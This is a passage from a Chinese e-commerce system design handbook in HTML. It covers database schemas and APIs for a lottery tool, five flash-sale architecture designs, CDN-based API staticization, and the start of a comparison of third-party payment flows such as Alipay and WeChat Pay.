class="keyword">COMMENT</span> <span class="string">'创建时间'</span>,</span><br><span class="line">    <span class="string">`create_by`</span> <span class="built_in">int</span>(<span class="number">11</span>) <span class="keyword">unsigned</span> <span class="keyword">NOT</span> <span class="literal">NULL</span> <span class="keyword">DEFAULT</span> <span class="string">'0'</span> <span class="keyword">COMMENT</span> <span class="string">'创建人staff_id'</span>,</span><br><span class="line">    <span class="string">`update_at`</span> <span class="built_in">int</span>(<span class="number">11</span>) <span class="keyword">unsigned</span> <span class="keyword">NOT</span> <span class="literal">NULL</span> <span class="keyword">DEFAULT</span> <span class="string">'0'</span> <span class="keyword">COMMENT</span> <span class="string">'更新时间'</span>,</span><br><span class="line">    <span class="string">`update_by`</span> <span class="built_in">int</span>(<span class="number">11</span>) <span class="keyword">unsigned</span> <span class="keyword">NOT</span> <span class="literal">NULL</span> <span class="keyword">DEFAULT</span> <span class="string">'0'</span> <span class="keyword">COMMENT</span> <span class="string">'修改人staff_id'</span>,</span><br><span class="line">    <span class="string">`status`</span> <span class="built_in">tinyint</span>(<span class="number">1</span>)  <span class="keyword">NOT</span> <span class="literal">NULL</span> <span class="keyword">DEFAULT</span> <span class="string">'0'</span> <span class="keyword">COMMENT</span> <span class="string">'状态 -1:deleted, 0:disable, 1:enable'</span>,</span><br><span class="line">    PRIMARY <span class="keyword">KEY</span> (<span class="string">`id`</span>)</span><br><span class="line">) <span class="keyword">ENGINE</span>=<span class="keyword">InnoDB</span> <span class="keyword">DEFAULT</span> <span class="keyword">CHARSET</span>=utf8mb4 <span class="keyword">COMMENT</span>=<span class="string">'抽奖场次表'</span>;</span><br></pre></td></tr></table></figure>

<p>第三、四要素<code>奖品配置</code>的<code>抽奖场次奖品表</code>：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="comment">-- 通用抽奖工具(万能胶Glue) glue_session_prizes 抽奖场次奖品表</span></span><br><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> <span class="string">`glue_session_prizes`</span> (</span><br><span class="line">    <span class="string">`id`</span> <span class="built_in">int</span>(<span class="number">11</span>) <span class="keyword">unsigned</span> <span class="keyword">NOT</span> <span class="literal">NULL</span> AUTO_INCREMENT <span class="keyword">COMMENT</span> <span class="string">'自增ID'</span>,</span><br><span class="line">    <span class="string">`session_id`</span> <span class="built_in">int</span>(<span class="number">11</span>) <span class="keyword">unsigned</span> <span class="keyword">NOT</span> <span class="literal">NULL</span> <span class="keyword">DEFAULT</span> <span class="string">'0'</span> <span class="keyword">COMMENT</span> <span class="string">'场次ID'</span>,</span><br><span class="line">    <span class="string">`node`</span> <span class="built_in">varchar</span>(<span class="number">255</span>) <span class="keyword">unsigned</span> <span class="keyword">NOT</span> <span class="literal">NULL</span> <span class="keyword">DEFAULT</span> <span class="string">''</span> <span class="keyword">COMMENT</span> <span class="string">'节点标识 按时间抽奖: 空值, 按抽奖次数抽奖: 第几次参与值, 按数额范围区间抽奖: 数额区间上限值'</span>,</span><br><span class="line">    <span class="string">`prize_type`</span> <span class="built_in">int</span>(<span class="number">11</span>) <span class="keyword">unsigned</span> <span class="keyword">NOT</span> <span class="literal">NULL</span> <span class="keyword">DEFAULT</span> <span class="string">'0'</span> <span class="keyword">COMMENT</span> <span class="string">'奖品类型 1:优惠券, 2:积分, 3:实物, 4:空奖 ...'</span>,</span><br><span class="line">    <span class="string">`name`</span> <span class="built_in">varchar</span>(<span class="number">255</span>) <span class="keyword">unsigned</span> <span class="keyword">NOT</span> <span class="literal">NULL</span> <span class="keyword">DEFAULT</span> <span class="string">''</span> <span class="keyword">COMMENT</span> <span class="string">'奖品名称'</span>,</span><br><span class="line">    <span class="string">`pic_url`</span> <span class="built_in">varchar</span>(<span class="number">255</span>) <span class="keyword">unsigned</span> <span class="keyword">NOT</span> <span class="literal">NULL</span> <span class="keyword">DEFAULT</span> <span class="string">''</span> <span class="keyword">COMMENT</span> <span class="string">'奖品图片'</span>,</span><br><span class="line">    <span class="string">`value`</span> <span class="built_in">varchar</span>(<span class="number">255</span>) <span class="keyword">unsigned</span> <span class="keyword">NOT</span> <span class="literal">NULL</span> <span class="keyword">DEFAULT</span> <span class="string">''</span> <span class="keyword">COMMENT</span> <span class="string">'奖品抽象值 优惠券:优惠券ID, 积分:积分值, 实物: sku ID'</span>,</span><br><span class="line">    <span class="string">`probability`</span> <span class="built_in">tinyint</span>(<span class="number">3</span>) <span class="keyword">unsigned</span> <span class="keyword">NOT</span> <span class="literal">NULL</span> <span class="keyword">DEFAULT</span> <span class="string">'0'</span> <span class="keyword">COMMENT</span> <span class="string">'中奖概率1~100'</span>,</span><br><span class="line">    <span class="string">`create_at`</span> <span class="built_in">int</span>(<span class="number">11</span>) <span class="keyword">unsigned</span> <span class="keyword">NOT</span> <span class="literal">NULL</span> <span class="keyword">DEFAULT</span> <span class="string">'0'</span> <span class="keyword">COMMENT</span> <span class="string">'创建时间'</span>,</span><br><span class="line">    <span class="string">`create_by`</span> <span class="built_in">int</span>(<span class="number">11</span>) <span class="keyword">unsigned</span> <span class="keyword">NOT</span> <span class="literal">NULL</span> <span class="keyword">DEFAULT</span> <span class="string">'0'</span> <span class="keyword">COMMENT</span> <span class="string">'创建人staff_id'</span>,</span><br><span class="line">    <span class="string">`update_at`</span> <span class="built_in">int</span>(<span class="number">11</span>) <span class="keyword">unsigned</span> <span class="keyword">NOT</span> <span class="literal">NULL</span> <span class="keyword">DEFAULT</span> <span class="string">'0'</span> <span class="keyword">COMMENT</span> <span class="string">'更新时间'</span>,</span><br><span class="line">    <span class="string">`update_by`</span> <span class="built_in">int</span>(<span class="number">11</span>) <span class="keyword">unsigned</span> <span class="keyword">NOT</span> <span class="literal">NULL</span> <span class="keyword">DEFAULT</span> <span class="string">'0'</span> <span class="keyword">COMMENT</span> <span class="string">'修改人staff_id'</span>,</span><br><span class="line">    <span class="string">`status`</span> <span class="built_in">tinyint</span>(<span class="number">1</span>)  <span class="keyword">NOT</span> <span class="literal">NULL</span> <span class="keyword">DEFAULT</span> <span class="string">'0'</span> <span class="keyword">COMMENT</span> <span class="string">'状态 -1:deleted, 0:disable, 1:enable'</span>,</span><br><span class="line">    PRIMARY <span class="keyword">KEY</span> (<span class="string">`id`</span>)</span><br><span class="line">) <span class="keyword">ENGINE</span>=<span class="keyword">InnoDB</span> <span class="keyword">DEFAULT</span> <span class="keyword">CHARSET</span>=utf8mb4 <span class="keyword">COMMENT</span>=<span class="string">'抽奖场次奖品表'</span>;</span><br></pre></td></tr></table></figure>

<p>第五要素<code>均匀投奖</code>的<code>抽奖场次奖品定时投放器表</code>：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="comment">-- 通用抽奖工具(万能胶Glue) glue_session_prizes_timer 抽奖场次奖品定时投放器表</span></span><br><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> <span class="string">`glue_session_prizes_timer`</span> (</span><br><span class="line">    <span class="string">`id`</span> <span class="built_in">int</span>(<span class="number">11</span>) <span class="keyword">unsigned</span> <span class="keyword">NOT</span> <span class="literal">NULL</span> AUTO_INCREMENT <span class="keyword">COMMENT</span> <span class="string">'自增ID'</span>,</span><br><span class="line">    <span class="string">`session_prizes_id`</span> <span class="built_in">int</span>(<span class="number">11</span>) <span class="keyword">unsigned</span> <span class="keyword">NOT</span> <span class="literal">NULL</span> <span class="keyword">DEFAULT</span> <span class="string">'0'</span> <span class="keyword">COMMENT</span> <span class="string">'抽奖场次奖品ID'</span>,</span><br><span class="line">    <span class="string">`delivery_at`</span> <span class="built_in">int</span>(<span class="number">11</span>) <span class="keyword">unsigned</span> <span class="keyword">NOT</span> <span class="literal">NULL</span> <span class="keyword">DEFAULT</span> <span class="string">'0'</span> <span class="keyword">COMMENT</span> <span class="string">'定时投放奖品数量的时间'</span>,</span><br><span class="line">    <span class="string">`prize_quantity`</span> <span class="built_in">tinyint</span>(<span class="number">3</span>) <span class="keyword">unsigned</span> <span class="keyword">NOT</span> <span class="literal">NULL</span> <span class="keyword">DEFAULT</span> <span class="string">'0'</span> <span class="keyword">COMMENT</span> <span class="string">'奖品数量'</span>,</span><br><span class="line">    <span class="string">`create_at`</span> <span class="built_in">int</span>(<span class="number">11</span>) <span class="keyword">unsigned</span> <span class="keyword">NOT</span> <span class="literal">NULL</span> <span class="keyword">DEFAULT</span> <span class="string">'0'</span> <span class="keyword">COMMENT</span> <span class="string">'创建时间'</span>,</span><br><span class="line">    <span class="string">`create_by`</span> <span class="built_in">int</span>(<span class="number">11</span>) <span class="keyword">unsigned</span> <span class="keyword">NOT</span> <span class="literal">NULL</span> <span class="keyword">DEFAULT</span> <span class="string">'0'</span> <span class="keyword">COMMENT</span> <span class="string">'创建人staff_id'</span>,</span><br><span class="line">    <span class="string">`update_at`</span> <span class="built_in">int</span>(<span class="number">11</span>) <span class="keyword">unsigned</span> <span class="keyword">NOT</span> <span class="literal">NULL</span> <span class="keyword">DEFAULT</span> <span class="string">'0'</span> <span class="keyword">COMMENT</span> <span class="string">'更新时间'</span>,</span><br><span class="line">    <span class="string">`update_by`</span> <span class="built_in">int</span>(<span class="number">11</span>) <span class="keyword">unsigned</span> <span class="keyword">NOT</span> <span class="literal">NULL</span> <span class="keyword">DEFAULT</span> <span class="string">'0'</span> <span class="keyword">COMMENT</span> <span class="string">'修改人staff_id'</span>,</span><br><span class="line">    <span class="string">`status`</span> <span class="built_in">tinyint</span>(<span class="number">1</span>)  <span class="keyword">NOT</span> <span class="literal">NULL</span> <span class="keyword">DEFAULT</span> <span class="string">'0'</span> <span class="keyword">COMMENT</span> <span class="string">'状态 -1:deleted, 0:wait, 1:success'</span>,</span><br><span class="line">    PRIMARY <span class="keyword">KEY</span> (<span class="string">`id`</span>)</span><br><span class="line">) <span class="keyword">ENGINE</span>=<span class="keyword">InnoDB</span> <span class="keyword">DEFAULT</span> <span class="keyword">CHARSET</span>=utf8mb4 <span class="keyword">COMMENT</span>=<span class="string">'抽奖场次奖品定时投放器表'</span>;</span><br></pre></td></tr></table></figure>

<p>其他表，抽奖记录&amp;奖品发放记录表：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="comment">-- 通用抽奖工具(万能胶Glue) glue_user_draw_record 用户抽奖记录表</span></span><br><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> <span class="string">`glue_user_draw_record`</span> (</span><br><span class="line">    <span class="string">`id`</span> <span class="built_in">int</span>(<span class="number">11</span>) <span class="keyword">unsigned</span> <span class="keyword">NOT</span> <span class="literal">NULL</span> AUTO_INCREMENT <span class="keyword">COMMENT</span> <span class="string">'自增ID'</span>,</span><br><span class="line">    <span class="string">`activity_id`</span> <span class="built_in">int</span>(<span class="number">11</span>) <span class="keyword">unsigned</span> <span class="keyword">NOT</span> <span class="literal">NULL</span> <span class="keyword">DEFAULT</span> <span class="string">'0'</span> <span class="keyword">COMMENT</span> <span class="string">'活动ID'</span>,</span><br><span class="line">    <span class="string">`session_id`</span> <span class="built_in">int</span>(<span class="number">11</span>) <span class="keyword">unsigned</span> <span class="keyword">NOT</span> <span class="literal">NULL</span> <span class="keyword">DEFAULT</span> <span class="string">'0'</span> <span class="keyword">COMMENT</span> <span class="string">'场次ID'</span>,</span><br><span class="line">    <span class="string">`prize_type_id`</span> <span class="built_in">int</span>(<span class="number">11</span>) <span class="keyword">unsigned</span> <span class="keyword">NOT</span> <span class="literal">NULL</span> <span class="keyword">DEFAULT</span> <span class="string">'0'</span> <span class="keyword">COMMENT</span> <span class="string">'奖品类型ID'</span>,</span><br><span class="line">    <span class="string">`user_id`</span> <span class="built_in">int</span>(<span class="number">11</span>) <span class="keyword">unsigned</span> <span class="keyword">NOT</span> <span class="literal">NULL</span> <span class="keyword">DEFAULT</span> <span class="string">'0'</span> <span class="keyword">COMMENT</span> <span class="string">'创建人user_id'</span>,</span><br><span class="line">    <span class="string">`create_at`</span> <span class="built_in">int</span>(<span class="number">11</span>) <span class="keyword">unsigned</span> <span class="keyword">NOT</span> <span class="literal">NULL</span> <span class="keyword">DEFAULT</span> <span class="string">'0'</span> <span class="keyword">COMMENT</span> <span class="string">'创建时间'</span>,</span><br><span class="line">    <span class="string">`update_at`</span> <span class="built_in">int</span>(<span class="number">11</span>) <span class="keyword">unsigned</span> <span class="keyword">NOT</span> <span class="literal">NULL</span> <span class="keyword">DEFAULT</span> <span class="string">'0'</span> <span class="keyword">COMMENT</span> <span class="string">'更新时间'</span>,</span><br><span class="line">    <span class="string">`status`</span> <span class="built_in">tinyint</span>(<span class="number">1</span>)  <span class="keyword">NOT</span> <span class="literal">NULL</span> <span class="keyword">DEFAULT</span> <span class="string">'0'</span> <span class="keyword">COMMENT</span> <span class="string">'状态 -1:未中奖, 1:已中奖 , 2: 发奖失败 , 3: 已发奖'</span>,</span><br><span class="line">    <span class="string">`log`</span> <span class="built_in">text</span> <span class="keyword">COMMENT</span> <span class="string">'操作信息等记录'</span>,</span><br><span class="line">    PRIMARY <span class="keyword">KEY</span> (<span class="string">`id`</span>)</span><br><span class="line">) <span class="keyword">ENGINE</span>=<span class="keyword">InnoDB</span> <span class="keyword">DEFAULT</span> <span class="keyword">CHARSET</span>=utf8mb4 <span class="keyword">COMMENT</span>=<span class="string">'用户抽奖记录表'</span>;</span><br></pre></td></tr></table></figure>

<h2 id="配置后台设计"><a href="#配置后台设计" class="headerlink" title="配置后台设计"></a>配置后台设计</h2><h3 id="创建活动"><a href="#创建活动" class="headerlink" title="创建活动"></a>创建活动</h3><p><img src="/articles/电商设计手册/20191229224816.png" alt></p>
<h3 id="创建活动场次"><a href="#创建活动场次" class="headerlink" title="创建活动场次"></a>创建活动场次</h3><p><img src="/articles/电商设计手册/20191230081157.png" alt></p>
<p><img src="/articles/电商设计手册/20191229224543.png" alt></p>
<p><img src="/articles/电商设计手册/20191229224834.png" alt> </p>
<h3 id="活动列表"><a href="#活动列表" class="headerlink" title="活动列表"></a>活动列表</h3><p><img src="/articles/电商设计手册/20191229223706.png" alt>  </p>
<h2 id="接口设计-2"><a href="#接口设计-2" class="headerlink" title="接口设计"></a>接口设计</h2><ol>
<li>获取活动信息 GET {version}/glue/activity</li>
</ol>
<p>请求参数：</p>
<table>
<thead>
<tr>
<th>字段</th>
<th>类型</th>
<th>是否必传</th>
<th>描述</th>
</tr>
</thead>
<tbody><tr>
<td>serial_no</td>
<td>string</td>
<td>Y</td>
<td>活动编号</td>
</tr>
</tbody></table>
<p>响应内容：</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="attr">"code"</span>: <span class="string">"200"</span>,</span><br><span class="line">    <span class="attr">"msg"</span>: <span class="string">"OK"</span>,</span><br><span class="line">    <span class="attr">"result"</span>: &#123;</span><br><span class="line">        <span class="attr">"serial_no"</span>: <span class="string">"string, 活动编号"</span>,</span><br><span class="line">        <span class="attr">"type"</span>: <span class="string">"number, 活动抽奖类型1: 按时间抽奖 2: 按抽奖次数抽奖 3:按数额范围区间抽奖"</span>,</span><br><span class="line">        <span class="attr">"name"</span>: <span class="string">"string, 活动名称"</span>,</span><br><span class="line">        <span class="attr">"description"</span>: <span class="string">"string, 活动描述"</span>,</span><br><span class="line">        <span class="attr">"start_time"</span>: <span class="string">"number, 活动开始时间"</span>,</span><br><span class="line">        <span class="attr">"end_time"</span>: <span class="string">"number, 活动开始时间"</span>,</span><br><span class="line">        <span class="attr">"remaining_times"</span>: <span class="string">"number, 活动抽奖次数限制，0不限制"</span>,</span><br><span class="line">        <span class="attr">"sessions_list"</span>:[</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="attr">"start_time"</span>: <span class="string">"number, 场次开始时间"</span>,</span><br><span class="line">                <span class="attr">"end_time"</span>: <span class="string">"number, 场次开始时间"</span>,</span><br><span class="line">                <span class="attr">"remaining_times"</span>: <span class="string">"number, 场次抽奖次数限制，0不限制"</span>,</span><br><span class="line">                <span class="attr">"prizes_list"</span>: [</span><br><span class="line">                    &#123;</span><br><span class="line">                        <span class="attr">"name"</span>: <span class="string">"string, 奖品名称"</span>,</span><br><span class="line">                        <span class="attr">"pic_url"</span>: <span class="string">"string, 奖品图片"</span></span><br><span class="line">                    &#125;</span><br><span class="line">                ]</span><br><span class="line">            &#125;</span><br><span class="line">        ]</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ol start="2">
<li>抽奖 POST {version}/glue/activity/draw</li>
</ol>
<p>请求参数：</p>
<table>
<thead>
<tr>
<th>字段</th>
<th>类型</th>
<th>是否必传</th>
<th>描述</th>
</tr>
</thead>
<tbody><tr>
<td>serial_no</td>
<td>string</td>
<td>Y</td>
<td>活动编号</td>
</tr>
<tr>
<td>uid</td>
<td>number</td>
<td>Y</td>
<td>用户ID</td>
</tr>
</tbody></table>
<p>响应内容：</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line">// 中奖</span><br><span class="line">&#123;</span><br><span class="line">    <span class="attr">"code"</span>: <span class="string">"200"</span>,</span><br><span class="line">    <span class="attr">"msg"</span>: <span class="string">"OK"</span>,</span><br><span class="line">    <span class="attr">"result"</span>: &#123;</span><br><span class="line">        <span class="attr">"serial_no"</span>: <span class="string">"string, spu id"</span>,</span><br><span class="line">        <span class="attr">"act_remaining_times"</span>: <span class="string">"number, 本活动抽奖剩余次数，0不限制"</span>,</span><br><span class="line">        <span class="attr">"session_remaining_times"</span>: <span class="string">"number, 本场次抽奖剩余次数，0不限制"</span>,</span><br><span class="line">        <span class="attr">"prizes_info"</span>: </span><br><span class="line">        &#123;</span><br><span class="line">            <span class="attr">"name"</span>: <span class="string">"string, 奖品名称"</span>,</span><br><span class="line">            <span class="attr">"pic_url"</span>: <span class="string">"string, 奖品图片"</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// 未中奖</span><br><span class="line">&#123;</span><br><span class="line">    <span class="attr">"code"</span>: <span class="string">"401"</span>,</span><br><span class="line">    <span class="attr">"msg"</span>: <span class="string">""</span>,</span><br><span class="line">    <span class="attr">"result"</span>: &#123;</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="结语"><a href="#结语" class="headerlink" title="结语"></a>结语</h2><p>活动营销系统中的第一个字系统<strong>通用抽奖工具</strong>今天讲完了，希望对大家有一定的帮助或启示。</p>
<h1 id="秒杀服务"><a href="#秒杀服务" class="headerlink" title="秒杀服务"></a>秒杀服务</h1><h2 id="前言-1"><a href="#前言-1" class="headerlink" title="前言"></a>前言</h2><p>本文结构很简单：</p>
<blockquote>
<p>5张图送你5种秒杀系统，再加点骚操作，再顺带些点心里话🤷‍♀️。</p>
</blockquote>
<h2 id="一个简单的秒杀系统"><a href="#一个简单的秒杀系统" class="headerlink" title="一个简单的秒杀系统"></a>一个简单的秒杀系统</h2><p><strong>实现原理：</strong> 通过redis原子操作减库存</p>
<p><strong>图一</strong> </p>
<p><img src="/articles/电商设计手册/20200501175532.png" alt></p>
<table>
<thead>
<tr>
<th>优点</th>
<th>缺点</th>
</tr>
</thead>
<tbody><tr>
<td>简单好用</td>
<td>考验redis服务能力</td>
</tr>
</tbody></table>
<table>
<thead>
<tr>
<th>是否公平</th>
</tr>
</thead>
<tbody><tr>
<td>公平</td>
</tr>
<tr>
<td>先到先得</td>
</tr>
</tbody></table>
<p>我们称这类秒杀系统为：</p>
<blockquote>
<p>简单秒杀系统</p>
</blockquote>
<p>如果刚开始QPS并不高，redis完全抗的下来的情况，完全可以依赖这个「简单秒杀系统」。</p>
<h2 id="一个够用的秒杀系统"><a href="#一个够用的秒杀系统" class="headerlink" title="一个够用的秒杀系统"></a>一个够用的秒杀系统</h2><p><strong>实现原理：</strong> 服务内存限流算法 + redis原子操作减库存</p>
<p><strong>图二</strong> </p>
<p><img src="/articles/电商设计手册/20200501183037.png" alt></p>
<table>
<thead>
<tr>
<th>优点</th>
<th>缺点</th>
</tr>
</thead>
<tbody><tr>
<td>简单好用</td>
<td>-</td>
</tr>
</tbody></table>
<table>
<thead>
<tr>
<th>是否公平</th>
</tr>
</thead>
<tbody><tr>
<td>不是很公平</td>
</tr>
<tr>
<td>相对的先到先得</td>
</tr>
</tbody></table>
<p>我们称这类秒杀系统为：</p>
<blockquote>
<p>够用秒杀系统</p>
</blockquote>
<h2 id="性能再好点的秒杀系统"><a href="#性能再好点的秒杀系统" class="headerlink" title="性能再好点的秒杀系统"></a>性能再好点的秒杀系统</h2><p><strong>实现原理：</strong> 服务本地内存原子操作减库存</p>
<blockquote>
<p>服务本地内存的库存怎么来的？</p>
</blockquote>
<p>活动开始前分配好每台机器的库存，推送到机器上。</p>
<p><strong>图三</strong> </p>
<p><img src="/articles/电商设计手册/20200501200309.png" alt></p>
<table>
<thead>
<tr>
<th>优点</th>
<th>缺点</th>
</tr>
</thead>
<tbody><tr>
<td>高性能</td>
<td>不支持动态伸缩容(活动进行期间)，因为库存是活动开始前分配好的</td>
</tr>
<tr>
<td>释放redis压力</td>
<td>-</td>
</tr>
</tbody></table>
<table>
<thead>
<tr>
<th>是否公平</th>
</tr>
</thead>
<tbody><tr>
<td>不是很公平</td>
</tr>
<tr>
<td>不是绝对的先到先得</td>
</tr>
</tbody></table>
<p>我们称这类秒杀系统为：</p>
<blockquote>
<p>预备库存秒杀系统</p>
</blockquote>
<h2 id="支持动态伸缩容的秒杀系统"><a href="#支持动态伸缩容的秒杀系统" class="headerlink" title="支持动态伸缩容的秒杀系统"></a>支持动态伸缩容的秒杀系统</h2><p><strong>实现原理：</strong> 服务本地协程Coroutine<strong>定时redis原子操作减部分库存</strong>到本地内存 + 服务本地内存原子操作减库存</p>
<p><strong>图四</strong> </p>
<p><img src="/articles/电商设计手册/20200501200846.png" alt></p>
<table>
<thead>
<tr>
<th>优点</th>
<th>缺点</th>
</tr>
</thead>
<tbody><tr>
<td>高性能</td>
<td>支持动态伸缩容(活动进行期间)</td>
</tr>
<tr>
<td>释放redis压力</td>
<td>-</td>
</tr>
<tr>
<td><strong>具备通用性</strong></td>
<td>-</td>
</tr>
</tbody></table>
<table>
<thead>
<tr>
<th>是否公平</th>
</tr>
</thead>
<tbody><tr>
<td>不是很公平，但是好了点</td>
</tr>
<tr>
<td>几乎先到先得</td>
</tr>
</tbody></table>
<p>我们称这类秒杀系统为：</p>
<blockquote>
<p>实时预备库存秒杀系统</p>
</blockquote>
<h2 id="公平的秒杀系统"><a href="#公平的秒杀系统" class="headerlink" title="公平的秒杀系统"></a>公平的秒杀系统</h2><p><strong>实现原理：</strong> 服务本地Goroutine<strong>定时同步是否售罄</strong>到本地内存 + 队列 + 排队成功轮训(或主动Push)结果</p>
<p><strong>图五</strong> </p>
<p><img src="/articles/电商设计手册/20200502195413.png" alt></p>
<table>
<thead>
<tr>
<th>优点</th>
<th>缺点</th>
</tr>
</thead>
<tbody><tr>
<td>高性能</td>
<td>开发成本高(需主动通知或轮训排队结果)</td>
</tr>
<tr>
<td>真公平</td>
<td>-</td>
</tr>
<tr>
<td><strong>具备通用性</strong></td>
<td>-</td>
</tr>
</tbody></table>
<table>
<thead>
<tr>
<th>是否公平</th>
</tr>
</thead>
<tbody><tr>
<td>很公平</td>
</tr>
<tr>
<td>绝对的先到先得</td>
</tr>
</tbody></table>
<p>我们称这类秒杀系统为：</p>
<blockquote>
<p>公平排队秒杀系统</p>
</blockquote>
<h2 id="骚操作"><a href="#骚操作" class="headerlink" title="骚操作"></a>骚操作</h2><blockquote>
<p>上面的秒杀系统还不够完美吗？</p>
</blockquote>
<p>答案：是的。</p>
<blockquote>
<p>还有什么优化的空间？</p>
</blockquote>
<p>答案：静态化获取秒杀活动信息的接口。</p>
<blockquote>
<p>静态化是什么意思?</p>
</blockquote>
<p>答案：比如获取秒杀活动信息是通过接口 <code>https://seckill.skrshop.tech/v1/acticity/get</code> 获取的。现在呢，我们需要通过<code>https://static-api.skrshop.tech/seckill/v1/acticity/get</code> 这个接口获取。有什么区别呢？看下面：</p>
<table>
<thead>
<tr>
<th>服务名</th>
<th>接口</th>
<th>数据存储位置</th>
</tr>
</thead>
<tbody><tr>
<td>秒杀服务</td>
<td><a href="https://seckill.skrshop.tech/v1/acticity/get" target="_blank" rel="noopener">https://seckill.skrshop.tech/v1/acticity/get</a></td>
<td>秒杀服务内存或redis等</td>
</tr>
<tr>
<td>接口静态化服务</td>
<td><a href="https://static-api.skrshop.tech/seckill/v1/acticity/get" target="_blank" rel="noopener">https://static-api.skrshop.tech/seckill/v1/acticity/get</a></td>
<td>CDN、本地文件</td>
</tr>
</tbody></table>
<p><strong>以前是这样</strong> </p>
<p><img src="/articles/电商设计手册/20200502195950.png" alt></p>
<p><strong>变成了这样</strong></p>
<p><img src="/articles/电商设计手册/20200502200723.png" alt> </p>
<p>结果：可以通过接口<code>https://static-api.skrshop.tech/seckill/v1/acticity/get</code>就获取到了秒杀活动信息，流量都分摊到了cdn，秒杀服务自身没了这部分的负载。</p>
<blockquote>
<p>小声点说：“秒杀结果我也敢推CDN😏😏😏。”</p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">备注：</span><br><span class="line">之后我们会分享`如何用Golang设计一个好用的「接口静态化服务」`。</span><br></pre></td></tr></table></figure>

<h1 id="总结-1"><a href="#总结-1" class="headerlink" title="总结"></a>总结</h1><p>上面我们得到了如下几类<code>秒杀系统</code></p>
<table>
<thead>
<tr>
<th>秒杀系统</th>
</tr>
</thead>
<tbody><tr>
<td>简单秒杀系统</td>
</tr>
<tr>
<td>够用秒杀系统</td>
</tr>
<tr>
<td>预备库存秒杀系统</td>
</tr>
<tr>
<td>实时预备库存秒杀系统</td>
</tr>
<tr>
<td>公平排队秒杀系统</td>
</tr>
</tbody></table>
<p>我想说的是里面没有最好的方案，也没有最坏的方案，只有<strong>适合你</strong>的。</p>
<p>拿<code>先到先得</code>来说，一定要看你们的产品对外宣传，切勿上来就追逐绝对的先到先得。其实你看所有的方案，相对而言都是“先到先得”，比如，活动开始一个小时了你再来抢，那相对于准时的用户自然抢不过，对吧。</p>
<p>又如<code>预备库存秒杀系统</code>，虽然不支持动态伸缩容。但是如果你的环境满足如下任意条件，就完全够用了。</p>
<ul>
<li>秒杀场景结束时间之快，通常几秒就结束了，真实活动可能会发生如下情况：<ul>
<li>服务压力大还没挂：根本就来不及动态伸缩容</li>
<li>服务压力大已经挂了：可以先暂停活动，服务起来&amp;扩容结束，用剩余库存重新推送</li>
</ul>
</li>
<li>运维自身不具备动态伸缩容的能力</li>
</ul>
<p>所以:</p>
<blockquote>
<p>合适好用就行，切勿过度设计。</p>
</blockquote>
<h1 id="交易中心"><a href="#交易中心" class="headerlink" title="交易中心"></a>交易中心</h1><h2 id="常见第三方支付流程"><a href="#常见第三方支付流程" class="headerlink" title="常见第三方支付流程"></a>常见第三方支付流程</h2><p>这几年的工作中一直与支付打交到，借着 <a href="https://github.com/skr-shop/manuals" target="_blank" rel="noopener">skr-shop</a> 这个项目来与大家一起分享探索一下支付系统该怎么设计、怎么做。我们先从支付的一些常见流程出发分析，找出这些支付的共性，抽象后再去探讨具体的数据库设计、代码结构设计。</p>
<p>相关项目：</p>
<ul>
<li><a href="https://github.com/helei112g/payment" target="_blank" rel="noopener">PHP 版本的支付SDK</a></li>
<li><a href="https://github.com/skr-shop/fool-pay" target="_blank" rel="noopener">Go 版本的支付SDK-开发中</a></li>
</ul>
<blockquote>
<p>支付整体而言的一个流程是：给第三方发起了一笔交易，用户通过第三方完成支付，第三方告诉我支付成功，我把用户购买的产品给用户。</p>
</blockquote>
<p><img src="/articles/电商设计手册/pay-1.jpg" alt="pay-1"></p>
<p>看似简单的流程，这里边不同的支付机构却有不同的处理。下面以我接触过的一些支付来总结一下</p>
<h3 id="国内支付"><a href="#国内支付" class="headerlink" title="国内支付"></a>国内支付</h3><p>国内的典型支付代表是：<strong>支付宝</strong>、<strong>微信</strong>、<strong>银行</strong>(以招商银行为例)，由于国内的支付都支持多种渠道的支付方式，为了描述简单，我们均以pc上的支付为例进行讲解。</p>
<h4 id="支付宝"><a href="#支付宝" class="headerlink" title="支付宝"></a>支付宝</h4><p>支付宝的接入是我觉得最简单的一种支付。对于在PC上的支付能力，支付宝提供了【电脑支付】。当用户下单后，商户系统根据支付宝的规则构建好一个url，用户跳转到这个url后进入到支付宝的支付页面，然后完成支付流程。</p>
<p>在支付成功后，支付宝会通过 <strong>同步通知</strong>、<strong>异步通知</strong> 两种方式告诉商户系统支付成功，并且两种通知方式的结果都是可信的，而且异步通知的消息延迟也非常短暂。</p>
<p>对于退款流程，支付宝支持全额、部分退款。并且能够根据商户的退款单号区分是否是同一笔退款进而避免了重复退款的可能。支付的退款是调用后同步返回结果，不会异步通知。</p>
<h4 id="微信支付"><a href="#微信支付" class="headerlink" title="微信支付"></a>微信支付</h4><p>微信并没有提供真的PC支付能力，但是我们可以利用【扫码支付】来达成电脑支付的目的。扫码支付有两种模式，这里以模式二为例。</p>
<p>微信调用下单接口获取到这个二维码链接，然后用户扫码后，进入支付流程。完成支付后微信会 <strong>异步通知</strong>，但是这里并没有 <strong>同步通知</strong>，因此前端页面只能通过定时轮训的方式检查这笔交易是否支付，直到查询到成功、或者用户主动关闭页面。</p>
<p>退款流程与支付宝最大的不同是，有一个 <strong>异步通知</strong> 需要商户系统进行处理。</p>
<blockquote>
<p>第一个不同点： 异步通知的接口需要处理多种不同类型的异步消息</p>
</blockquote>
